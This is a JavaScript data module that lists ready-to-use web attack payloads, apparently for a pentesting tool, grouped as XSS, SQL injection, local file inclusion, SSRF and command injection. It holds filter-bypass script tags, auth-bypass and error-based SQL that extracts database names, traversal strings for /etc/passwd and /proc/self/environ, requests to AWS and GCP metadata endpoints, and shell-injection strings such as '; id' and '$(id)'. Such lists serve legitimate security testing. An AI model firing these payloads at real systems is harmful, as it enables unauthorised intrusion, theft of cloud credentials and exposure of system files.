export const payloadCategories = [
  {
    id: "xss",
    name: "XSS",
    payloads: [
      { name: "Basic", code: "<script>alert(1)</script>" },
      { name: "Img Onerror", code: "<img src=x onerror=alert(1)>" },
      { name: "Svg Onload", code: "<svg/onload=alert(1)>" },
      { name: "Iframe JS", code: "<iframe src=javascript:alert(1)>" },
      { name: "Event Handler", code: "\" autofocus onfocus=alert(1)>" },
      { name: "HTML Injection", code: "<h1>Hacked</h1>" },
      { name: "Filter Bypass", code: "<scr<script>ipt>alert(1)</scr</script>ipt>" },
      { name: "XSS Polyglot", code: "\"><svg/onload=alert(1)>" }
    ]
  },

  {
    id: "sqli",
    name: "SQL Injection",
    payloads: [
      { name: "Auth Bypass", code: "' OR 1=1 -- " },
      { name: "Boolean True", code: "' OR '1'='1" },
      { name: "Boolean False", code: "' AND '1'='2" },
      { name: "Union Select Basic", code: "' UNION SELECT NULL,NULL,NULL -- " },
      { name: "Union Select String", code: "' UNION SELECT 'abc','def','ghi' -- " },
      { name: "MySQL Sleep", code: "' AND SLEEP(5) -- " },
      { name: "Postgres Sleep", code: "'; SELECT pg_sleep(5); -- " },
      { name: "Error-Based", code: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x)a)-- -" }
    ]
  },

  {
    id: "lfi",
    name: "Local File Inclusion",
    payloads: [
      { name: "Basic Traversal", code: "../../../../../etc/passwd" },
      { name: "Double Encoding", code: "%2e%2e%2f%2e%2e%2fetc/passwd" },
      { name: "Null Byte", code: "../../../../etc/passwd%00" },
      { name: "PHP Filter", code: "php://filter/convert.base64-encode/resource=index.php" },
      { name: "Proc Environ", code: "/proc/self/environ" },
      { name: "Apache Logs", code: "/var/log/apache2/access.log" },
      { name: "Nginx Logs", code: "/var/log/nginx/access.log" }
    ]
  },

  {
    id: "ssrf",
    name: "SSRF",
    payloads: [
      { name: "Localhost HTTP", code: "http://127.0.0.1/" },
      { name: "Loopback", code: "http://[::1]/" },
      { name: "Docker Gateway", code: "http://172.17.0.1/" },
      { name: "AWS Metadata", code: "http://169.254.169.254/latest/meta-data/" },
      { name: "GCP Metadata", code: "http://metadata.google.internal/computeMetadata/v1/" },
      { name: "File Protocol", code: "file:///etc/passwd" },
      { name: "FTP", code: "ftp://127.0.0.1:21" }
    ]
  },

  {
    id: "cmd",
    name: "Command Injection",
    payloads: [
      { name: "Semicolon", code: "; id" },
      { name: "Pipe", code: "| whoami" },
      { name: "And", code: "&& id" },
      { name: "Or", code: "|| id" },
      { name: "Backticks", code: "`id`" },
      { name: "Subshell", code: "$(id)" },
      { name: "Newline Inject", code: "\nid" }
    ]
  }
];